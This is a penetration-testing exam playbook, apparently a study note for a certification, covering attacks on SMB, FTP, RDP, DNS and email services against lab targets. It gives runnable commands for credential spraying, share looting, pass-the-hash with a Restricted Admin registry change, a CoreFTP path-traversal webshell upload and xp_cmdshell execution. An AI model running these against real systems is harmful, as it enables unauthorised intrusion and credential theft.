# NOTE — Common Services Exploitation & Lateral Movement (Exam Playbook)

## ID
706

## Module
Attacking Common Services

## Kind
methodology

## Title
Common Services Exploitation — End-to-End Playbook

## Description
Exam-ready attack chains for SMB, FTP, RDP, DNS, and Email: enumerate → find credentials or misconfigurations → pivot to higher-privilege access or sensitive data. Triggers, decision trees, and signal-to-fix mappings for under-pressure triage.

## Tags
methodology, smb, ftp, rdp, dns, email, initial-access, lateral-movement, enumeration, misconfigurations, brute-force, pass-the-hash, zone-transfer, exam, cheatsheet, decision-tree, null-session, anonymous

---

## TL;DR — The Common Service Attack Flow

1. **Port scan & service identification** — nmap -sV to map the surface (445, 139, 21, 3389, 53, 25, 110, etc.).
2. **Enumerate misconfigurations** — null sessions, anonymous auth, default creds, overly permissive shares/ACLs.
3. **Harvest credentials** — via share reads (config files, SSH keys), email spray, SMTP user enum.
4. **Brute-force weak passwords** — FTP, RDP, email; always check password policy first (lockout threshold).
5. **Lateral movement** — RDP with PtH, SSH with private key, SQL commands for RCE, email for pivot info.
6. **Exfiltrate flags / pivot deeper** — flags in shares, email, file contents; use creds to reach next service.

> **Golden rule:** Before brute-force, pull the password policy (no lockout = safe to spray; strict lockout = go slow or poison). Misconfigurations are 100× faster than exploits; always try default creds + null sessions first.

> **OPSEC fork:** If service is patched/hardened on the main target, check other hosts on the subnet — services are often inconsistently hardened. Use `--local-auth` against a whole subnet with found creds.

---

## Phase 1 — Port Scan & Service Identification

**Goal:** identify open services and versions.

```bash
sudo nmap -v -sV -sC -p- <TARGET_IP>
# Shortcut for common-services ports:
sudo nmap -v -sV -sC -p21,53,25,110,139,143,389,445,465,587,993,995,3306,3389 <TARGET_IP>
```

**Trigger table — what services mean:**

| Port | Service | Exploit Path | Precondition |
|---|---|---|---|
| 21 | FTP | anonymous login → file read/upload | check banner for version (CoreFTP = CVE check) |
| 53 | DNS | zone transfer (AXFR) → subdomain enum | recursion enabled or internal network |
| 25, 587 | SMTP | user enum (VRFY/EXPN/RCPT) → brute-force → open relay | no rate-limiting |
| 110, 995 | POP3 | weak creds → mailbox access | creds found in other services |
| 139, 445 | SMB | null session → share enum → file read/write | signing disabled or misconfigured ACLs |
| 389, 636 | LDAP | null session → user/group enum | unauthenticated bind allowed |
| 3389 | RDP | brute-force → PtH (with Restricted Admin) | no account lockout or weak creds |
| 3306 | MySQL | default creds (root:blank) → RCE via UDF | runs as root or system user |

**Output checkpoint:** You have a service inventory. Now proceed to Phase 2 for each service.

---

## Phase 2 — Enumerate for Misconfigurations (Before Brute-Force)

### SMB (139/445)

**Null session enumeration — the free lunch:**

```bash
# Check for null session (most common misconfiguration)
smbmap -H <TARGET_IP>                                           # lists shares + perms
smbclient -N -L //<TARGET_IP>                                   # lists shares (no password)
enum4linux-ng <TARGET_IP> -A                                    # users, groups, policy, shares

# If any of above works → you have free enumeration
smbmap -H <TARGET_IP> -r <SHARE>                                # list files in share
smbclient //<TARGET_IP>/<SHARE> -N                              # interactive (get <FILE>, mget *, etc.)
```

**When null session fails → credentialed approach:**

```bash
# Pull password policy FIRST (before any brute-force)
crackmapexec smb <TARGET_IP> --pass-pol
rpcclient -U "" -N <TARGET_IP> -c "getdompwinfo"
enum4linux-ng <TARGET_IP> -P

# Enumerate users (multiple methods — try all)
rpcclient -U "" -N <TARGET_IP> -c "enumdomusers" | grep "\[" | cut -d"[" -f2 | cut -d"]" -f1 > users.txt
enum4linux -U <TARGET_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > users.txt

# Common username patterns (if userlist is thin)
# First.Last, F.Last, FirstL, admin, root, etc. — build list and spray
```

**Output checkpoint:** Share list (what's readable), user list (for spray), password policy (how aggressive to be).

### FTP (21)

**Anonymous login + version check:**

```bash
ftp <TARGET_IP>
# login: anonymous, password: <blank> or anonymous@example.com
ls -la
mget *                                                           # download everything
put <FILE>                                                       # test write (if needed)
```

**If anonymous fails → check version for CVEs:**

```bash
# Get banner
nmap -p21 -sV <TARGET_IP>
searchsploit "<SERVICE> <VERSION>"

# Common: CoreFTP < 727 = path traversal via HTTP PUT (see Phase 5)
```

**Output checkpoint:** Files downloaded, write permission confirmed, service version noted for CVE.

### RDP (3389)

**Brute-force setup (no null session available):**

```bash
# Test one set of creds first (default admin:admin, or known username + blank)
xfreerdp /v:<TARGET_IP> /u:administrator /p:'password' /cert:ignore

# If lock, check if account lockout policy exists (none = safe to brute)
# If policy exists, use low-and-slow spray instead
```

### DNS (53)

**Zone transfer attempt (most likely to work on internal DNS):**

```bash
# Base domain
dig AXFR @<TARGET_IP> <DOMAIN>

# If fails, subdomain enum first
python3 subbrute.py <DOMAIN> -s /path/to/wordlist.txt -r <RESOLVED_IP>
# Then try AXFR on each subdomain
for subdomain in $(cat discovered_subs.txt); do
  dig AXFR @<TARGET_IP> $subdomain.<DOMAIN>
done
```

### Email (25/110/143, 587/993, 995)

**User enumeration (SMTP):**

```bash
# RCPT TO method (most reliable, no rate-limiting)
smtp-user-enum -M RCPT -U <USERLIST> -D <DOMAIN> -t <TARGET_IP>

# If VRFY/EXPN work (less common)
echo "vrfy admin" | nc <TARGET_IP> 25
echo "expn admin" | nc <TARGET_IP> 25
```

**Test open relay:**

```bash
nmap -p25 --script smtp-open-relay <TARGET_IP>
# Or manual: swaks --from attacker@test.com --to victim@real.com --server <TARGET_IP>
```

**Output checkpoint:** Valid users enumerated, open relay status confirmed.

---

## Phase 3 — Brute-Force Weak Credentials

### SMB Brute-Force

```bash
# Always check policy first (see Phase 2)
# If no lockout or we know threshold (e.g., 5 attempts):

crackmapexec smb <TARGET_IP> -u <USERLIST> -p <WORDLIST> | grep +
# OR
crackmapexec smb <TARGET_IP> --local-auth -u administrator -p <WORDLIST> | grep +
```

**High-confidence targets (try these words first):**
```
<CompanyName>, <CompanyName>123, Password1, Welcome1, Admin@123
<Season><Year> (e.g., Winter2024), <Month><Year> (Jan2024)
<Username>, <Username>123
```

### RDP Brute-Force

```bash
# Single shot first (test connectivity + check for lockout policy)
xfreerdp /v:<TARGET_IP> /u:administrator /p:'Admin@123' /cert:ignore

# If you get "too many attempts", stop — account locked. Wait or pivot.
# If blank password works, great. Otherwise:

# Hydra (parallel, but noisier)
hydra -l <USER> -P <WORDLIST> rdp://<TARGET_IP>

# crackmapexec RDP
crackmapexec rdp <TARGET_IP> -u <USER> -p <WORDLIST> | grep +
```

### Email Brute-Force

```bash
# SMTP auth (if supported)
hydra -l <EMAIL> -P <WORDLIST> smtp://<TARGET_IP>

# POP3 (often has weak passwords)
hydra -l <EMAIL> -P <WORDLIST> pop3://<TARGET_IP>

# IMAP
hydra -l <EMAIL> -P <WORDLIST> imap://<TARGET_IP>
```

**Output checkpoint:** Valid credentials obtained for at least one service.

---

## Phase 4 — Lateral Movement & Pivoting

### SMB → File Download → Credential Harvest

Once you have valid SMB creds:

```bash
smbmap -u <USER> -p '<PASSWORD>' -d <DOMAIN> -H <TARGET_IP> -R | grep -E "\.txt|\.cfg|\.conf|\.env|\.key|id_rsa|web\.config"

# Download sensitive files
smbclient //<TARGET_IP>/<SHARE> -U <USER> -c "get <FILE>"

# Look for:
# - SSH private keys (id_rsa, authorized_keys)
# - Config files (web.config, appsettings.json, app.config)
# - Credentials in scripts or batch files
# - Excel/CSV with creds
# - RDP files (.rdp with saved passwords)
# - KeePass databases (.kdbx)
```

### SMB Credentials → SSH Access (Private Key)

```bash
chmod 600 id_rsa
ssh -i id_rsa <USER>@<TARGET_IP>
# Inside SSH:
cat flag.txt
```

### SMB Credentials → RDP Access

```bash
xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASSWORD>' /cert:ignore
```

### RDP → Find NTLM Hash → Pass-the-Hash

Once logged in via RDP with low-privileged creds:

```powershell
# Find hash (often in notes on Desktop, recent documents, or registry)
type C:\Users\<USER>\Desktop\pentest-notes.txt
# Look for: "Administrator Hash: <NTLM_HASH>"

# Enable Restricted Admin Mode (required for PtH)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Back on attacker box:

```bash
xfreerdp /v:<TARGET_IP> /u:administrator /pth:<NTLM_HASH> /cert:ignore
```

### Email Credentials → Mailbox Access

```bash
# POP3
telnet <TARGET_IP> 110
USER <EMAIL>
PASS <PASSWORD>
LIST
RETR 1                                                          # read email 1
QUIT

# IMAP (if available)
telnet <TARGET_IP> 143
A001 LOGIN <EMAIL> <PASSWORD>
A002 SELECT INBOX
A003 FETCH 1 BODY[]
```

**Output checkpoint:** Flag retrieved or creds for next service obtained.

---

## Phase 5 — Exploit Service Vulnerabilities (if misc. + creds don't work)

### FTP Path Traversal (CoreFTP CVE-2022-22836)

**Precondition:** FTP auth enabled + CoreFTP < build 727 + HTTP interface available (port 80/443).

```bash
# Arbitrary file write via HTTP PUT with path traversal
curl -X PUT \
  -u <FTP_USER>:<FTP_PASS> \
  --path-as-is \
  --data-binary '<WEBSHELL_CONTENT>' \
  http://<TARGET_IP>/../../../../../../../../var/www/html/shell.php

# Or write to C:\ on Windows
curl -X PUT \
  -u <FTP_USER>:<FTP_PASS> \
  --path-as-is \
  --data-binary '<PAYLOAD>' \
  http://<TARGET_IP>/..\\..\\..\\c:\\inetpub\\wwwroot\\shell.aspx
```

### LDAP Null Session → User Enum (AD preparation)

```bash
# Test null bind
ldapsearch -x -H ldap://<TARGET_IP> -s base namingcontexts
# If works, dump users
ldapsearch -x -H ldap://<TARGET_IP> -b "dc=<DOMAIN>,dc=<TLD>" "(objectClass=user)" sAMAccountName
```

---

## Decision Tree — Under Exam Pressure

```
START: "I found open services. What do I do?"
│
├─→ [1] Run Phase 1: Port scan (nmap -sV)
│   │
│   ├─→ [2] SMB (445) found?
│   │   ├─ YES → Try null session (smbmap -H)
│   │   │   ├─ Works? → Phase 2: Enum shares, extract files (creds, SSH keys)
│   │   │   │   └─ Found creds? → Phase 4: SSH or RDP pivot
│   │   │   └─ Fails? → Phase 3: Brute-force (check policy first!)
│   │   │       └─ Found creds? → Phase 4: Pivot
│   │   │       └─ No luck > 10min → STUCK → Skip to next service
│   │   └─ NO → Continue to next
│   │
│   ├─→ [3] FTP (21) found?
│   │   ├─ YES → Try anonymous login
│   │   │   ├─ Works? → Download all files, check for creds/configs
│   │   │   │   └─ Found SSH key? → SSH pivot
│   │   │   └─ Fails? → Check version for CVE (searchsploit)
│   │   │       └─ CVE exists & creds known? → Exploit (Phase 5)
│   │   │       └─ No CVE or no creds > 5min → Skip
│   │   └─ NO → Continue
│   │
│   ├─→ [4] RDP (3389) found?
│   │   ├─ YES → Check if creds already found (SMB pivot)
│   │   │   ├─ Have creds? → Test with xfreerdp
│   │   │   │   ├─ Works? → Enum Desktop, search for NTLM hash, enable RestrictedAdmin, PtH
│   │   │   │   └─ Fails → STUCK (account locked) → Skip
│   │   │   └─ No creds → Brute-force (slow — account lockout likely)
│   │   │       └─ Found? → Same as above
│   │   │       └─ No > 5min → Skip
│   │   └─ NO → Continue
│   │
│   ├─→ [5] DNS (53) found?
│   │   ├─ YES → Try zone transfer on base domain (dig AXFR)
│   │   │   ├─ Works? → Extract flags from TXT records
│   │   │   └─ Fails? → Subdomain enum (subbrute), try AXFR on each
│   │   │       └─ Found? → Extract flags
│   │   │       └─ No > 5min → Skip
│   │   └─ NO → Continue
│   │
│   └─→ [6] Email (25/110, etc.) found?
│       ├─ YES → Enum valid users (smtp-user-enum RCPT)
│       │   ├─ Found users? → Brute-force passwords (hydra pop3 or smtp)
│       │   │   ├─ Found creds? → Mailbox access (telnet), read emails for flags
│       │   │   └─ No > 10min → Skip
│       │   └─ Enum fails? → Test open relay (nmap smtp-open-relay)
│       │       └─ Works? → Phishing (not exam-relevant, skip)
│       └─ NO → Continue
│
└─→ [7] Nothing found or all skipped?
    └─ STUCK > 15min total → Check for service misconfig you missed
        (e.g., very weak password, very obvious default cred)
        └─ Still nothing → Move to other hosts or modules
```

---

## Signal → Counter-Move Lookup Table

Use this when something isn't working — trace the symptom to the fix.

| Symptom | Likely Cause | Exact Counter-Move |
|---|---|---|
| smbmap returns permission denied | Null session blocked | Try enum4linux -U (RPCclient fallback) or skip to brute-force |
| smb brute-force times out after few attempts | Account lockout policy active | Check `--pass-pol` first; use password spray (one pwd per user) instead |
| xfreerdp shows "too many connections" | RDP connection limit or account locked | Wait 30s, try different user, or pivot to SMB instead |
| ftp anonymous login hangs or times out | FTP port open but service unresponsive | Nmap -p21 -sV to confirm; try FTP on alternate port (2121, 8021) |
| dig AXFR hangs | DNS recursion disabled or firewall blocking | Try nmap -p53 -sV first; then try zone transfer on found subdomains (subbrute) |
| smtp-user-enum finds no users | VRFY/EXPN/RCPT disabled or domain mismatch | Verify domain name with MX lookup (dig mx); try RCPT after you find valid mailbox |
| hydra brute-force super slow | Server rate-limiting or IP ban | Use different wordlist (top 100 passwords), lower thread count (-t 1) |
| SSH key works but SSH fails | Key permissions wrong (world-readable) | chmod 600 <keyfile>; verify with ssh -i <key> -v <user>@<host> |
| Found creds but can't access SMB share | Share requires AD domain context | Use domain context: -d <DOMAIN> or try --local-auth if local account |
| RDP -> found hash but PtH fails | Restricted Admin not enabled | Re-RDP with original creds, run the reg add, then retry PtH |
| Email password found but can't access mailbox | Wrong email format (user@domain vs user) | Try both <user> and <user@domain.com> formats in telnet/hydra |

---

## Master Cheatsheet — One-Liners by Scenario

### Scenario 1: SMB → Creds → RDP → Flag (No Auth Start)

```bash
# 1. Null session enum
smbmap -H $TARGET
# → Found shares, no creds needed

# 2. Download SSH key
smbclient //$TARGET/SHARE -N -c "get id_rsa"

# 3. SSH in
chmod 600 id_rsa && ssh -i id_rsa $USER@$TARGET

# 4. Grab flag
cat flag.txt
```

### Scenario 2: SMB → RDP Creds in Share → PtH to Admin

```bash
# 1. Auth to SMB (brute-force or found creds)
smbclient //$TARGET/SHARE -U $USER -c "get pentest-notes.txt"

# 2. Extract NTLM hash from file
grep "Hash:" pentest-notes.txt

# 3. Enable Restricted Admin on same machine (RDP first)
xfreerdp /v:$TARGET /u:$USER /p:'$PASS' /cert:ignore
# Inside RDP: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# 4. PtH from attack box
xfreerdp /v:$TARGET /u:administrator /pth:$HASH /cert:ignore

# 5. Grab flag
cat C:\Users\Administrator\Desktop\flag.txt
```

### Scenario 3: FTP Anonymous → Config File with Creds → SQL RCE

```bash
# 1. FTP anonymous
ftp $TARGET
# anonymous / <blank>
mget *.cfg *.conf *.txt

# 2. Parse config for DB creds
grep -i "password\|user\|server" *.cfg

# 3. SQL RCE (SQL Server example)
mssqlclient.py -windows-auth $DOMAIN/$USER@$TARGET
# > enable_xp_cmdshell
# > xp_cmdshell 'whoami'
```

### Scenario 4: DNS Zone Transfer → Subdomain enum → Flag in TXT

```bash
# 1. Zone transfer on base (usually fails)
dig AXFR @$TARGET $DOMAIN

# 2. Subdomain enum
python3 subbrute.py $DOMAIN -s /path/to/wordlist.txt -r $TARGET

# 3. Zone transfer on each subdomain
for sub in $(cat subdomains.txt); do
  dig AXFR @$TARGET $sub.$DOMAIN | grep TXT
done
```

### Scenario 5: Email User Enum → Brute-force → Mailbox Access

```bash
# 1. Enum users
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
  -D $DOMAIN -t $TARGET

# 2. Brute-force password (found user = user1@domain.com)
hydra -l user1@$DOMAIN -P /usr/share/wordlists/rockyou.txt pop3://$TARGET

# 3. Access mailbox
telnet $TARGET 110
USER user1@$DOMAIN
PASS <PASSWORD>
LIST
RETR 1
QUIT
```

### Scenario 6: Null Session → User List → Password Spray

```bash
# 1. Enum users via null session
rpcclient -U "" -N $TARGET -c "enumdomusers" > users.txt

# 2. Extract username format
grep -oP '\w+' users.txt | sort -u > userlist.txt

# 3. Spray common passwords (low-and-slow)
crackmapexec smb $TARGET -u userlist.txt -p 'Password1' --continue-on-success | grep +
crackmapexec smb $TARGET -u userlist.txt -p 'Welcome1' --continue-on-success | grep +
```

---

## Quick Reference — Tools by Function

| Function | Tool | Command |
|---|---|---|
| **Enum SMB** | smbmap | `smbmap -H $IP` |
| | enum4linux-ng | `enum4linux-ng $IP -A` |
| | crackmapexec | `crackmapexec smb $IP -u "" -p "" --shares` |
| **Enum RPC (users/groups)** | rpcclient | `rpcclient -U "" -N $IP -c "enumdomusers"` |
| **Enum LDAP** | ldapsearch | `ldapsearch -x -H ldap://$IP -b "dc=dom,dc=com" "(objectClass=user)"` |
| **Brute SMB** | crackmapexec | `crackmapexec smb $IP -u users.txt -p pass.txt` |
| **Brute RDP** | hydra / crackmapexec | `hydra -l user -P pass.txt rdp://$IP` |
| **Brute Email** | hydra | `hydra -l user@dom -P pass.txt pop3://$IP` |
| **Brute FTP** | hydra | `hydra -l user -P pass.txt ftp://$IP` |
| **Download SMB files** | smbclient | `smbclient //$IP/SHARE -U user -c "mget *"` |
| **Zone transfer (DNS)** | dig | `dig AXFR @$IP domain.com` |
| **Subdomain enum** | subbrute | `python3 subbrute.py domain.com -s wordlist.txt -r $IP` |
| **RDP connection** | xfreerdp | `xfreerdp /v:$IP /u:user /p:pass /cert:ignore` |
| **RDP PtH** | xfreerdp | `xfreerdp /v:$IP /u:user /pth:HASH /cert:ignore` |
| **SSH with key** | ssh | `ssh -i key.pem user@$IP` |
| **Email (telnet)** | telnet | `telnet $IP 110` (POP3 commands: USER, PASS, LIST, RETR) |

---

## Top Gotchas — Time-Killers in Exams

1. **Null session succeeded but `smbclient -L` still says "permission denied"** — Try `smbmap -H` instead; sometimes smbclient is pickier. If both fail, SMB signing may be on.

2. **Brute-force killed after 3 attempts** — You didn't check `--pass-pol` first. An account lockout policy is active. Use password *spray* (one password against many users) instead of brute-force.

3. **SSH key works in `ssh -i` but login hangs** — Key has wrong permissions. Always `chmod 600 <keyfile>` immediately after download.

4. **RDP PtH says "logon failure" even with correct hash** — You forgot to enable Restricted Admin Mode on the target *before* trying PtH. RDP back in with original creds, add the registry key, then retry.

5. **Zone transfer fails on base domain but the flag is in a subdomain TXT record** — Always run subdomain enum (subbrute) after AXFR fails. You likely missed a zone that *is* transferrable.

6. **FTP says "you don't have permission" but you're in the dir** — Try `put <FILE>` to test write access. If that fails, the server is read-only. Look for other access vectors.

7. **Email brute-force says "user not found" but you know the user exists** — You might be using wrong email format. Try `user` instead of `user@domain.com` or vice versa. Or the user doesn't have email access (SMB-only).

8. **Found admin NTLM hash but can't access shares with it** — Hashes don't work across SMB between domains easily. Stick to RDP PtH or SSH if you have the key. Otherwise, you need the plaintext password for SMB.

9. **Crackmapexec says "Pwn3d!" but actual RDP/SSH still fails** — "Pwn3d!" means local admin on *that specific host* — not necessarily RDP-enabled or SSH-running. Check ports first.

10. **You found creds in 3 different places but none of them work anywhere** — Try the creds against *all* services (SMB, RDP, FTP, SMTP, etc.). Password reuse is common; you might be trying the wrong combo.

---

## Related Vault Notes

- [[02-attack-concept]] — Mental model (Source → Process → Privileges → Destination) for reasoning about any service attack.
- [[03-service-misconfigurations]] — Framework for identifying default/weak creds, anonymous auth, overly permissive ACLs.
- [[04-finding-sensitive-info]] — Mindset for harvesting creds from shares, email, configs after initial access.
- [[07-attacking-smb]] — Deep walkthrough of null session enum + user enum + brute-force chain.
- [[11-attacking-rdp]] — RDP initial access + PtH with Restricted Admin Mode walkthrough.
- [[13-attacking-dns]] — DNS zone transfer + subdomain enumeration workflow.
- [[15-attacking-email-services]] — SMTP user enum + POP3/IMAP mailbox access.

---

## Triage Backlink

**If you're stuck with a symptom, grep `ATTACK-PATHS.md`:**

```bash
grep -i "smb.*null\|anonymous ftp\|rdp.*brute\|zone transfer\|weak creds" ../ATTACK-PATHS.md
```

This methodology → referenced in `[[../ATTACK-PATHS.md]]` for symptom triage.

---

## Credits & Audit

- **Written:** 2026-05-15
- **Sources:** Sections 2–16 of CPTS Attacking Common Services module
- **Gold standard template:** [[../ad-enum-attacks/00-METHODOLOGY.md]]
- **Status:** Exam-ready (all four retrieval surfaces: signal-table, decision-tree, master-cheatsheet, gotchas)
